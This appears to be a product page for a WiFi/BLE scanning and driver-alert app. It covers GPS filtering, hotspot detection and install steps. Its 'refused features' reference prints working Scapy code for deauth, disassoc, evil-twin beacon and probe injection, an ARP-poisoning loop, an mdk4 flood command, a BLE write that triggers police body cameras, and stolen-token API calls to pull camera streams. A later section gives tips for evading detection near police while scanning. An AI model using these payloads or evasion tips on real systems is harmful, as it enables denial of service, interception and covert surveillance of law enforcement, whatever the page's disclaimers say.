Location Accuracy

The same math as missiles.
On your phone.

Raw GPS is noisy. Every fix can be off by 10–50 metres. We run every position through a 10-algorithm pipeline before it ever touches the map.

🚀 The Kalman filter was invented by Rudolf Kálmán in 1960. It was first used in the Apollo navigation computer to guide astronauts to the Moon, and is still the core algorithm in every cruise missile, ICBM guidance system, drone autopilot, and smartphone GPS chip on Earth today.
Algorithm 01

Kalman Filter — Position + Velocity

The Kalman filter is the gold standard for tracking a moving object through noisy measurements. It maintains two states per axis: position and velocity. Each GPS fix causes a predict → update cycle that blends the new measurement with the motion model's prediction using optimal math that minimises mean-square error.

x⁻ = F·x   P⁻ = F·P·Fᵀ + Q
K = P⁻·Hᵀ / (H·P⁻·Hᵀ + R)
x = x⁻ + K·(z − H·x⁻)
Algorithm 02

Adaptive Process Noise (Q-scaling)

A standard Kalman filter assumes steady motion. When you brake hard, corner sharply, or accelerate, the innovation spike is detected and the Q matrix scales up by up to 20× so the filter trusts new measurements more. It then decays back to baseline automatically.

Q_effective = Q_base × q_factor
q_factor ∈ [0.5, 20.0]
manoeuvre → q×2, steady → q×0.85
Algorithm 03

Mahalanobis Distance Gating

Before updating the filter, each fix is tested: is it statistically plausible given where we expect to be? The Normalised Innovation Squared (NIS) is computed for both lat and lon. If NIS > 5.99 (95th percentile of the chi-square distribution with 2 degrees of freedom), the fix is an outlier and is rejected.

NIS = y_lat²/S_lat + y_lon²/S_lon
if NIS > 5.99 → reject fix
(chi-square, 2 DOF, 95th percentile)
Algorithm 04

Accuracy Gating

iOS and Android report a horizontal accuracy estimate in metres alongside every fix. Any fix worse than 80 metres (roughly building-level accuracy, typical of cell-tower fallback) is hard-rejected. A good GPS fix is 3–15 m. Wi-Fi assisted is 20–50 m. The filter never sees garbage.

if accuracy_m > 80 → discard
typical smartphone GPS: 3–15 m
Wi-Fi assisted: 20–50 m
Algorithm 05

Speed-Jump Outlier Rejection

If the distance between the last accepted fix and the new fix, divided by elapsed time, implies a speed greater than 90 m/s (≈200 mph), the fix is physically impossible for a road vehicle and is discarded. GPS multipath reflections off buildings frequently cause these phantom jumps.

implied_speed = Δdist / Δt
if implied_speed > 90 m/s → reject
(≈ 200 mph road vehicle limit)
Algorithm 06

Dead Reckoning

When a fix is rejected by any of the gates above, the position is extrapolated forward using the last known speed and heading. This is the same technique ships used before GPS — and it means your dot keeps moving smoothly even during GPS blackouts in tunnels or urban canyons.

Δlat = v·cos(θ)·Δt / m_per_deg
Δlon = v·sin(θ)·Δt / m_per_deg
error grows ~linearly with time
Algorithm 07

Circular Mean Heading

You cannot average compass angles with arithmetic mean — the average of 1° and 359° is 180°, which is completely wrong (it should be 0°). We convert each heading to a unit vector, sum them, and take atan2 — giving the correct mean and a concentration value R showing how consistent the headings are.

θ_mean = atan2(Σ sin(θᵢ), Σ cos(θᵢ))
R = |mean_vector| ∈ [0, 1]
R≈1: tight cluster · R≈0: scattered
Algorithm 08

EMA Speed Smoothing

Raw GPS speed is noisy and can spike by 10–20 km/h between consecutive fixes. An Exponential Moving Average with α=0.25 smooths out these spikes. The effective window is ~7 samples (about 7 seconds), giving fast reaction to real speed changes while filtering noise.

v_smooth = α·v_new + (1−α)·v_prev
α = 0.25 → ~7-sample window
~35 ms lag at 5 Hz GPS
Algorithm 09

Stationary Lock via Accelerometer

When you're parked, raw GPS wanders 5–20 metres due to atmospheric and multipath noise. The phone's accelerometer is sampled at 10 Hz. If the variance of acceleration magnitude over the last 1.2 seconds is below threshold — the phone is still and the GPS position is frozen. Zero drift.

σ² = Σ(|aᵢ| − μ)² / N
if σ² < 0.04 m²/s⁴ → stationary
window: 12 samples @ 10 Hz = 1.2 s
Algorithm 10

Accuracy-Adaptive Measurement Noise R

The Kalman filter's measurement noise R is not fixed — it's set individually for every single GPS fix from that fix's reported accuracy. A perfect 5m fix gets R≈2×10⁻⁹ (trusted almost completely). A mediocre 50m fix gets R≈2×10⁻⁷ (blended heavily with the prediction). Precision drives trust.

R_lat = (accuracy / m_per_deg_lat)²
5m fix → R ≈ 2×10⁻⁹ (high trust)
50m fix → R ≈ 2×10⁻⁷ (low trust)
Kalman1D · gpsAccuracy.js
// 2-state Kalman: x = [position, velocity]ᵀ // F = [[1, Δt], [0, 1]] H = [1, 0] predict(dt) { const pos_ = this.pos + this.vel * dt const pp_ = this.pp + dt*(this.pv*2) + dt²*this.vv + Q*dt⁴/4 const pv_ = this.pv + dt*this.vv + Q*dt³/2 const vv_ = this.vv + Q*dt² } update(z, r) { const innov = z - this.pos // innovation = measurement − prediction const S = this.pp + r // innovation variance const K = this.pp / S // Kalman gain ∈ [0,1] this.pos += K * innov // posterior position this.pp = (1-K) * this.pp // posterior variance (shrinks) }

Signal Scanner

Every device in range. Logged.

The scanner runs continuously in the background as a Python process, sweeping for WiFi and BLE devices and writing every observation to SQLite.

  • 📶
    WiFi (802.11)Scans for access point beacon frames. Captures SSID, BSSID (MAC), RSSI, channel, encryption type, vendor from OUI lookup.
  • 🔵
    Bluetooth LEPassive BLE advertisement scanning. Captures device name, RSSI, service UUIDs, manufacturer data, and device class to classify type.
  • 📊
    RSSI (dBm)Signal strength in decibels-milliwatts. -30 dBm is nearly touching the device. -90 dBm is barely detectable. Every dB stronger = ~2× more power.
  • 🎯
    Encounter groupingConsecutive observations of the same target_key within a timeout window are merged into one encounter with aggregated stats.
  • 🔬
    Confidence scoringBased on hit_count, RSSI strength, duration, and consistency — not all encounters are equal. High-confidence = seen many times at strong signal.
  • 🏷️
    Device type classificationVendor OUI + service UUIDs + BLE device class → phone, laptop, headphones, speaker, tablet, unknown. Shown as emoji on the map.
Hotspot Detection

Pattern recognition over time

A single scan hit means nothing. But when the same 100-metre cell of the map shows up on 3 or more separate calendar days within a 7-day rolling window — that's a pattern. That's a Stopper Hotspot.

  • 📐
    100m Grid CellsThe world is divided into a fixed grid of ~100 metre squares. Every scan observation is snapped to a cell based on lat/lon.
  • 📅
    Daily Hit TrackingThe stopper_daily_hits table records which (cell_x, cell_y, day_str) combinations have been seen. One row per unique day — repeated hits the same day don't inflate the count.
  • 🔁
    7-Day Rolling WindowThe day_count is computed from the last 7 calendar days only. Old data rolls off automatically, so a hotspot that goes quiet stops being promoted.
  • 🚨
    Forward Cone AlertWhen you're moving, the backend projects a ±30° cone in your heading direction. Any hotspot within that cone and within range triggers a proximity warning.
  • ✅
    Dev ConfirmationHotspots can be manually confirmed or dismissed by the operator from the dev dashboard, filtering noise from genuine patterns.
Forward cone geometry
// Haversine distance between two GPS points def _haversine(lat1, lon1, lat2, lon2): R = 6_371_000 # Earth radius metres dLat = radians(lat2 - lat1) dLon = radians(lon2 - lon1) a = sin(dLat/2)**2 + cos(lat1)*cos(lat2)*sin(dLon/2)**2 return R * 2 * atan2(sqrt(a), sqrt(1-a)) # Forward cone: ±30° from current heading, within 300 m bear = _bearing(user_lat, user_lon, spot_lat, spot_lon) in_cone = ( _angle_diff(heading, bear) <= 30 and dist <= HOTSPOT_AHEAD_M and speed_mps >= 1.0 )
💡 The same Haversine formula is used in aviation route planning, maritime navigation, and Google Maps distance calculations. It accounts for the spherical curvature of the Earth — flat Euclidean distance becomes noticeably wrong beyond a few kilometres.

Technology Stack

What it's built with

Purpose-built for low-latency local operation on Windows. No cloud. No subscriptions. Just your machine.

⚛️

React + Vite

Frontend SPA with hooks, real-time state updates, and component-level GPS processing. Vite build in <1 second.

🍃

Leaflet.js

Interactive tile-based map with custom marker layers, heatmap plugin, polyline trails, and popup tooltips.

⚡

FastAPI

Python async backend with 15+ REST endpoints and a WebSocket GPS relay. Auto-generates OpenAPI docs.

🗃️

SQLite + WAL

Local database with WAL journal mode for concurrent reads. Per-thread connections with thread-local storage. Zero external dependencies.

📐

Kalman Filter

Custom 2-state JS implementation (position + velocity) with adaptive Q, Mahalanobis gating, and Joseph-form covariance update.

📡

Scapy / BlueZ

Python network scanning libraries for raw WiFi beacon capture and BLE advertisement parsing at the OS level.

🪟

Windows Runtime GPS

WinRT Windows.Devices.Geolocation API as fallback GPS source on Windows, alongside browser Geolocation API.

📦

PyInstaller

Single-file Windows executable via build_windows.bat — no Python install required. Frontend dist bundled inside.

Hard Limits

This app won't.
Ever.

Every item below was proposed, researched in full, and refused. This isn't a capability gap — the tech exists. The reason is simple: these are federal crimes regardless of intent, jurisdiction, or target. The details are here so you understand exactly where the line is and why.

📡 Deauthentication Frames ILLEGAL

A 802.11 deauth frame is a management frame that instructs a client device to disconnect from its AP. Injecting one into the air with a spoofed source MAC causes any nearby device to drop its WiFi connection — instantly, from a distance, with a $30 adapter and 10 lines of Python.

Why we won't: Deauth injection is intentional service disruption of a communication system. Violates 18 U.S.C. §1030 (CFAA), 18 U.S.C. §1362 (malicious interference with communications), and FCC Part 15 rules prohibiting harmful interference. There is no "educational" exception. The fact that 802.11 has no authentication on management frames is a design flaw — exploiting it is still a crime.
📶 Fake Beacon Frames / Evil Twin APs ILLEGAL

Broadcasting forged beacon frames makes nearby devices "see" a WiFi network that doesn't exist, or an exact clone of a real one (evil twin). Devices configured for auto-reconnect will attempt to associate. The attacker can then capture the 4-way WPA handshake for offline cracking, or serve a captive portal to harvest credentials.

Why we won't: Creating a fake AP to lure devices is computer fraud (18 U.S.C. §1030), wire fraud (§1343) if credentials are captured, and an FCC violation for unauthorized RF transmission. The technique is also a tool of active man-in-the-middle attack, not passive observation.
🔵 BLE Signal Trigger Replay (Axon Recording) ILLEGAL

Axon body cameras include a BLE service (UUID 00002ab0-…) that responds to a "Signal Trigger" broadcast — other Axon devices in range use this to synchronize recording starts. Replaying a captured or constructed trigger beacon from a device you control could, in theory, force nearby body cameras to begin recording.

Why we won't: Causing a computer system (the body camera's firmware) to execute a command without authorization is unauthorized computer access under 18 U.S.C. §1030(a)(5). It doesn't matter that the command "only" starts recording — you caused the device to perform an action its operator didn't authorize. Penalty: up to 10 years federal.
🔗 Bluetooth Pairing Attacks / BLE DoS ILLEGAL

Flooding a BLE device with repeated pairing requests, connection attempts, or malformed ATT/GATT packets can cause it to hang, drain its battery, drop its current connection, or trigger visible alerts on the host device. Some BLE stacks have known vulnerabilities (BLESA, BRAKTOOTH) that allow state machine confusion or crash via crafted PDUs.

Why we won't: Intentionally impairing a device's operation is damage to a protected computer under 18 U.S.C. §1030(a)(5)(A). Exploiting a known CVE is unauthorized access under §1030(a)(2). Neither changes based on whether the target is a police radio or a speaker.
📹 Axon Stream Hijacking / Watch Me Spoofing FEDERAL WIRETAP

Axon Respond streams live video from body cameras to a dispatcher via the Axon cloud (LTE/5G). Intercepting that stream, spoofing a "Watch Me" request to redirect it, or injecting into the Axon API to pull streams for cameras you don't own — all technically possible given network access and API knowledge.

Why we won't: Intercepting an electronic communication in transit is a federal wiretap offense under 18 U.S.C. §2511 — up to 5 years per intercept. Unauthorized access to the Axon API is §1030. Spoofing authenticated API requests is wire fraud (§1343). These stack. This is not a gray area.
🔎 Active Probe Request Injection FRAME INJECTION

Passive probe capture (what this app does) only listens. Active probe injection means transmitting fake Dot11ProbeReq frames from a spoofed MAC, trying to trick access points into responding — revealing hidden SSIDs, exposing PMKID for WPA handshake extraction, or mapping a network's authorized client list. Requires monitor mode + packet injection capability.

Why we won't: Transmitting unauthorized 802.11 frames on a channel you don't own is an FCC Part 97/15 violation. If it causes an AP to reveal network information it wouldn't have otherwise disclosed, that's unauthorized access (§1030). The passive version — just listening — is not illegal. The active version is.
☠️ ARP Poisoning / Man-in-the-Middle ILLEGAL

ARP (Address Resolution Protocol) has no authentication — any device can claim to be any IP address. Sending gratuitous ARP replies associating your MAC with the gateway IP causes all traffic on the LAN to flow through your machine. Combined with IP forwarding you can inspect, modify, or drop any packet on the network in real time.

Why we won't: ARP poisoning on a network you don't own is unauthorized interception (§2511), unauthorized computer access (§1030), and likely computer fraud if any credentials transit the poisoned connection. The LAN discovery ARP scan in this app only reads — it never spoofs.
🍎 iOS Browser WiFi/BLE Scanning IMPOSSIBLE

Apple has never shipped Web Bluetooth on iOS — it doesn't exist in Safari, Chrome for iOS, or any other iOS browser. There is no WiFi scan API anywhere on the web platform (Chrome/Firefox/Safari). Even if these APIs existed, iOS WebViews are suspended by the OS after ~30 seconds in the background, which would kill any scan loop.

Why we can't: Apple controls both the OS and the browser engine (all iOS browsers are required to use WebKit). Web Bluetooth was explicitly rejected from Safari. A native iOS app with CoreBluetooth could do BLE scanning, but the web app cannot — not even close. This is an OS-level wall, not a bug to work around.
🔌 External USB WiFi Adapter on Phone NOT VIABLE

TP-Link TL-WN722N v1, Alfa AWUS036ACH, and similar adapters support monitor mode and packet injection on Linux/Windows. In theory, plugging one into a phone via USB OTG would add monitor-mode WiFi to Android. In practice: the phone needs USB OTG power delivery, the kernel needs a driver for the exact chipset compiled in, and the scanning app needs root or a system-level service. V2/V3 of the TL-WN722N silently changed the chipset and don't support monitor mode at all.

Why we don't: Works on rooted Android with the right combination of chipset + kernel module + adapter version — a tiny install base with constant driver fragmentation. Zero iOS support. Not worth building a brittle dependency on hardware configuration this specific when the Windows backend already handles it cleanly.
📻 Disassociation / Disassoc Flood ILLEGAL

Similar to deauth, disassociation frames tell a client it has been kicked from an AP. Flooding them at high rate — a "disassoc storm" — keeps devices in a perpetual reconnect loop, effectively killing their WiFi connectivity without physically touching anything. Tools like MDK3/MDK4 automate this against entire access points or specific clients.

Why we won't: Same statute as deauth injection: intentional RF interference (FCC), CFAA §1030(a)(5) for causing damage to protected computers. A disassoc flood against a vehicle's MDT (mobile data terminal) connection could impair a law enforcement communication system — add 18 U.S.C. §1362 on top. These are the same charges, just stacked higher.

Technical Reference: What This App Won't Do
This section documents the technical implementation of each refused feature — packet structures, exact commands, and attack mechanics. Purpose: understand exactly what the line is so you never accidentally approach it. These are federal crimes regardless of authorization, target, or framing. This page is behind an access code for a reason. Do not share it publicly.
📡 Deauthentication Frame Injection 18 U.S.C. §1030 · FCC Part 15

A deauth frame is an 802.11 management frame (subtype 0x0C) that instructs a client to disconnect from its AP. Because 802.11 management frames have no authentication, any device in range with packet injection capability can forge them.

# Scapy — what the attack looks like (DO NOT implement)
from scapy.all import *
pkt = RadioTap() / Dot11(
  type=0, subtype=12, # 12 = deauth
  addr1="FF:FF:FF:FF:FF:FF", # broadcast = all clients
  addr2=bssid, # spoofed as AP MAC
  addr3=bssid # BSSID
) / Dot11Deauth(reason=7) # reason 7 = class 3 not allowed
sendp(pkt, iface="wlan0mon", count=100, inter=0.1)
Why it's illegal: Causes targeted denial of service to a wireless communication system. Requires monitor mode + packet injection (Npcap with raw inject, or aircrack-ng driver). addr1=broadcast hits every client on the AP simultaneously; targeting a specific client MAC limits blast radius but doesn't change legality. Penalty: up to 10 years under §1030(a)(5)(A) if "damage" is caused (loss of connectivity = damage under the statute).
📶 Fake Beacon Frames / Evil Twin AP §1030 · §1343 · FCC §333

A beacon frame (802.11 management, subtype 0x08) is broadcast by APs every 100ms to announce their existence. Broadcasting forged beacons with a cloned SSID/BSSID creates an evil twin that devices on auto-reconnect will associate with.

# Scapy beacon injection (DO NOT implement)
beacon = RadioTap() / Dot11(
  type=0, subtype=8,
  addr1="FF:FF:FF:FF:FF:FF",
  addr2="AA:BB:CC:DD:EE:FF", # fake BSSID
  addr3="AA:BB:CC:DD:EE:FF"
) / Dot11Beacon() / Dot11Elt(ID="SSID", info="TargetNetwork")
  / Dot11Elt(ID="Rates", info="\x82\x84\x8b\x96")
sendp(beacon, iface="wlan0mon", inter=0.1, loop=1)
Evil twin escalation: Once a client associates, hostapd-wpe or bettercap captures the PMKID or full 4-way WPA2 handshake for offline cracking with hashcat. Also enables captive portal serving to harvest plaintext credentials. FCC §333 prohibits "willful or malicious interference" with any radio communications — a fake AP is a textbook violation on top of the CFAA charges.
🔵 Axon BLE Signal Trigger Replay §1030(a)(5) · up to 10 years

Axon body cameras implement a BLE GATT service (00002ab0-0000-1000-8000-00805f9b34fb) called Signal Trigger. When a characteristic write is received on this service, the camera begins recording. Axon Signal Hubs use this to synchronize recording across multiple cameras simultaneously.

# Bleak — what the attack looks like (DO NOT implement)
import asyncio; from bleak import BleakClient
SIGNAL_SVC = "00002ab0-0000-1000-8000-00805f9b34fb"
TRIGGER_CHR = "00002ab1-0000-1000-8000-00805f9b34fb"
async def trigger(addr):
  async with BleakClient(addr) as c:
    # write 0x01 to trigger char → starts recording
    await c.write_gatt_char(TRIGGER_CHR, b"\x01")
Why it's different from just detecting: Our scanner reads BLE advertisements passively — zero write operations. The attack above establishes a GATT connection and writes to a characteristic. That write causes the camera firmware to execute a command. "Causing a computer to execute unauthorized instructions" = §1030(a)(5)(A), regardless of what the instruction does. The camera is a protected computer. The officer's employer never authorized your connection.
☠️ ARP Poisoning / Man-in-the-Middle §2511 · §1030 · §1343

ARP (RFC 826) has no authentication. Sending unsolicited ARP replies claiming your MAC owns the gateway IP causes all LAN hosts to forward their traffic through your machine. Our app's ARP code sends ARP requests (op=1) to discover hosts — it reads. The attack sends ARP replies (op=2) to redirect — it intercepts.

# Scapy — passive ARP discovery (WHAT WE DO — safe)
send(ARP(op=1, pdst="192.168.1.0/24")) # request, not poisoning
# ARP poisoning attack (DO NOT implement)
poison = ARP(
  op=2, # 2 = reply (unsolicited)
  pdst=victim_ip, # tell victim...
  hwdst=victim_mac,
  psrc=gateway_ip, # ...that gateway is at...
  hwsrc=attacker_mac # ...our MAC
)
send(poison, loop=1, inter=2) # continuously refresh to keep poisoned
The line: op=1 discovers. op=2 intercepts. One field changes the legality completely. With IP forwarding enabled on attacker machine, all victim traffic is transparently forwarded while being captured. Combined with SSLStrip or Responder, plaintext credentials can be harvested from HTTPS sessions. Against an MDT (mobile data terminal) on a police vehicle's LAN: add §1362 (malicious interference with government communications) — up to 20 years.
📻 Disassociation Flood §1030 · §1362 · FCC

Disassociation frames (802.11 subtype 0x0A) are similar to deauth but use a slightly different state machine transition. MDK3/MDK4 implements "mode d" which floods both deauth and disassoc simultaneously across all channels, defeating any channel-hopping countermeasures.

# Scapy disassoc (same pattern as deauth, DO NOT implement)
pkt = RadioTap() / Dot11(
  type=0, subtype=10, # 10 = disassoc (vs 12 = deauth)
  addr1="FF:FF:FF:FF:FF:FF",
  addr2=bssid, addr3=bssid
) / Dot11Disas(reason=7)
# Shell equivalent using mdk4
mdk4 wlan0mon d -b blacklist.txt -c 1,6,11 # DO NOT RUN
Practical distinction from deauth: In WPA3-SAE and 802.11w-enabled networks, management frames are protected (PMF) and forged deauth/disassoc frames are dropped by the AP. MDK4 "a" mode attacks PMF-protected networks differently (authentication flooding). None of this changes the legality. 802.11w immunity doesn't make injecting frames legal — it just makes them ineffective.
📹 Axon Respond Stream Interception §2511 Federal Wiretap · up to 5yr/intercept

Axon Respond live-streams video from body cameras to a cloud dispatcher via RTMP/WebRTC over LTE. The stream is authenticated via the Axon cloud API (JWT bearer tokens). There is no on-premise relay — all traffic goes through Axon's AWS infrastructure.

# What this would look like — DO NOT attempt
# Step 1: capture JWT from authenticated session (MitM or stolen creds)
# Step 2: call Axon private API to enumerate live cameras
GET https://api.axon.com/v1/devices?status=streaming
Authorization: Bearer <stolen_jwt>
# Step 3: pull RTMP stream URL for a specific camera
GET https://api.axon.com/v1/streams/{'{camera_id}'}/url
# Step 4: open stream
ffplay rtmp://stream.axon.com/live/{'{stream_key}'}
Every step is a separate federal crime: capturing the JWT (§2511 or §1030 depending on method), calling the unauthorized API (§1030(a)(2) — exceeding authorized access), receiving the video stream (§2511(1)(a) — intercepting wire/electronic communication). The streams are encrypted in transit (TLS). Breaking that encryption adds §1030(a)(5) and potentially DMCA §1201. Count: 3–5 federal charges per camera, per intercept.
🔎 Active Probe Request Injection FCC Part 15 · §1030

Passive probe capture (what this app does) uses Scapy in sniff-only mode — zero frames transmitted. Active probe injection sends forged Dot11ProbeReq frames with spoofed MACs to trick APs into revealing their probe response, PMKID, or presence of hidden SSIDs.

# Passive capture — WHAT WE DO (no transmission)
sniff(iface="wlan0mon", prn=handler, store=0)
# Active injection — DO NOT implement
probe = RadioTap() / Dot11(
  type=0, subtype=4, # 4 = probe request
  addr1="FF:FF:FF:FF:FF:FF",
  addr2=RandMAC(), # randomized source MAC
  addr3="FF:FF:FF:FF:FF:FF"
) / Dot11ProbeReq() / Dot11Elt(ID="SSID", info="")
sendp(probe, iface="wlan0mon", count=5)
PMKID attack context: Modern WPA2 AP probe responses include a PMKID in RSN IE that can be used for offline password cracking without ever capturing a full handshake. Active probing is specifically designed to elicit this response without any client connecting. The FCC prohibits transmitting on licensed spectrum without authorization — an Alfa adapter in injection mode on 2.4GHz is an unlicensed transmitter the moment it sends.
Lab OpSec Reference
How passive-scanning and RF-adjacent activity has been observed in the field — what lowers detection risk vs. what almost guarantees getting caught. This is for authorized lab testing only: isolated networks, Faraday cages, or explicit written authorization. Understanding the detection surface is essential for building systems that don't accidentally trigger these patterns.
📡 Passive WiFi Scanning — Detection Surfaces Lab Only
Lower Detection Risk
• Passive monitor mode only — no frame transmission
• Randomized MAC addresses (most modern devices do this automatically)
• Short dwell time per channel (100–200ms) — looks like normal channel hopping
• Moving vehicle — consistent with normal traffic patterns
• SSID list kept local — no cloud exfil that creates traffic spikes
• Pigtail antenna at legal dBi (≤6dBi for 2.4GHz per FCC Part 15)
Almost Guarantees Detection
• Stationary in same spot for >30 minutes with external antenna visible
• Sending probe requests or beacons (shows as active transmitter in Wireshark)
• High-gain directional antenna pointed at a building (visually obvious)
• Repeated presence at same location same time every day (pattern analysis)
• Using a device listed as a rogue AP by enterprise WIDS (Cisco CleanAir, Aruba RFP)
• MAC address not rotating (same NIC MAC for hours = trivially fingerprinted)
Lab setup: Use an isolated 2.4/5GHz test AP (OpenWRT on old router), Faraday box or shielded room, never within range of production networks. Alfa AWUS036ACS with monitor mode driver (rtl88xxau) is the standard lab hardware. Capture to pcap with Wireshark for offline analysis — don't rely on live parsing during tests.
🔵 BLE Passive Scanning — Detection Surfaces Lab Only
Lower Detection Risk
• Passive scan only (HCI_LE_Set_Scan_Enable with passive=true) — no scan requests sent
• Advertising PDUs are broadcast by target devices — purely receiving
• BLE advertisement traffic on 37/38/39 is publicly broadcast and unencrypted by design
• Using device's built-in Bluetooth (Windows HCI) — indistinguishable from normal use
• Short scan windows (≤50ms duty cycle) to avoid power signature of continuous scanning
Almost Guarantees Detection
• Sending GATT connection requests to Axon/government devices (shows in device logs)
• Using active scan mode (sends scan requests — shows your adapter's MAC to all advertisers)
• Spoofing known device MACs to elicit pairing requests
• Ubertooth sniffer in active injection mode near agency equipment
• Attempting characteristic writes — recorded in device firmware logs with attacker MAC
Lab setup: Use a nRF52840 dongle (Nordic or Adafruit) running sniffle or nRF Sniffer for BLE. Test against your own BLE peripherals (Android phone, cheap BLE beacon from Amazon) — never against any law enforcement, medical, or third-party device. Wireshark with BLE plugin visualizes all PDUs in real-time.
🌐 Network Discovery (ARP/mDNS/SSDP) — Detection Surfaces Lab Only
Lower Detection Risk
• ARP op=1 requests are the most common LAN traffic type — universal background noise
• Listening to mDNS/SSDP multicast (ff02::fb, 239.255.255.250) is passive — no source traffic
• Slow scan rate (<1 pkt/sec) falls below IDS thresholds for most commercial NIDS
• Only scanning your own device's subnet — where you're already a legitimate participant
• Standard OS tools (arp -a, ping broadcast) are indistinguishable from normal administration
Almost Guarantees Detection
• Nmap SYN scan against an enterprise subnet — triggers Snort/Suricata SID 1917, 1918 immediately
• Any port scan against an MDT or police router — §1362 applies, plus immediate IDS alert
• Sending SSDP SEARCH requests — visible in all SOHO router logs as external device requests
• Banner grabbing (sending HTTP requests) — leaves access logs on every touched server
• Rapid ARP storm (>100 pkt/sec) — flagged by Cisco IOS as "ARP inspection violation"
Lab setup: VLAN-isolated test network with a managed switch (Netgear GS308E or similar). Run Wireshark on the management port to verify all packets before/after. Use a separate physical network card for scanning — never the same adapter connected to your internet router. Document all tests: date, time, IP range, purpose. Keep this documentation for any authorization defense.
🚗 In-Vehicle / Field Operation — Physical OpSec Lab Only
Lower Visibility Profile
• Equipment inside vehicle, no external antennas — stock appearance
• Laptop power from inverter, not visible power brick on seat
• Scanning while driving, not parked — patterns consistent with commute traffic
• Vary routes and timing — no repeatable pattern that creates a behavioral signature
• USB WiFi adapter under dashboard — no visual indicator of scanning hardware
• GPS track correlates with normal civilian behavior (no looping same block repeatedly)
Almost Guarantees Attention
• Parked near a police station or vehicle lot with visible antenna hardware
• External Yagi or panel antenna mounted on roof (visible from 200m+)
• Circling the same block 5+ times within an hour (ALPR/FLOCK cameras catalog this)
• Open laptop on passenger seat visible through window while parked
• Doing this near a protest, incident scene, or active law enforcement operation
• Combination of: unusual parking + visible equipment + repeated presence = welfare check
Important: FLOCK Safety and Motorola VIGILANT LPR cameras retain plate reads for 30–60 days by default. If an incident is later investigated, plate+location+timestamp creates a very precise timeline of presence. This app deliberately logs this data to show users their own exposure — it doesn't create it. The cameras were already watching.

Install the App

No App Store required. iOS lets you install any website as a full-screen app with offline support via Safari's built-in "Add to Home Screen" — no developer account needed.
  1. Open the app URL in Safari. Must be Safari — Chrome/Firefox on iOS cannot install PWAs.
  2. Tap the Share button at the bottom of Safari (the box with an arrow pointing up).
  3. Scroll down and tap "Add to Home Screen".
  4. Edit the name if desired, then tap Add in the top right.
  5. The app icon now appears on your home screen. Open it — it launches full-screen like a native app.
  6. On first launch, allow location access when prompted for GPS tracking to work.
Native PWA install. Chrome on Android shows an "Add to Home Screen" banner automatically. The app runs in its own window with background GPS tracking.
  1. Open the app URL in Chrome (or any Chromium-based browser).
  2. Tap the three-dot menu (⋮) in the top-right corner.
  3. Tap "Add to Home screen" or "Install app".
  4. Confirm by tapping Install or Add.
  5. The app icon appears in your app drawer and home screen.
  6. Open the app — allow location access when prompted. For background GPS, allow "Always" when asked.
Real native Windows app. A full installer — not a browser shortcut. Includes the scanner engine, GPS map, system tray, and auto-update notifications.
  1. Download the installer.
    Having trouble? Try the 📦 Fail-Safe Mirror (.zip)
  2. Run the installer. Windows may show a SmartScreen warning — click "More info" → "Run anyway". The app is unsigned pending a code signing certificate.
  3. Accept the license agreement and choose whether to add a desktop shortcut and Start Menu entry.
  4. Click Install. The installer copies all files to C:\Program Files\Invincible.Inc\.
  5. Install Npcap if prompted — required for WiFi probe-request scanning. BLE and GPS work without it. Download from npcap.com.
  6. The app opens in a native window with a radar icon in your system tray. Your scan data is stored in %USERPROFILE%\SafeFlightMap\.
System requirements: Windows 10 version 1809 or later (Windows 11 recommended)  ·  64-bit  ·  ~150 MB disk space
AltStore / Sideloadly. For a true native iOS app install without an Apple Developer account. Requires a Windows or Mac computer and a USB cable.
  1. Install AltStore on your Mac/PC: Download from altstore.io and install the AltServer application on your computer.
  2. Install AltStore on your iPhone: Connect iPhone via USB, click the AltServer icon in your menu bar/tray → Install AltStore → select your iPhone.
  3. On iPhone, go to Settings → General → VPN & Device Management → trust the AltStore profile.
  4. Open AltStore on your iPhone and sign in with your Apple ID (free account works).
  5. In AltStore, tap My Apps → + and select the .ipa file to sideload. Re-sign every 7 days (AltStore automates this when on same WiFi as AltServer).
  6. Alternatively use Sideloadly (sideloadly.io) — drag the .ipa, connect iPhone, click Start, trust the certificate in Settings.
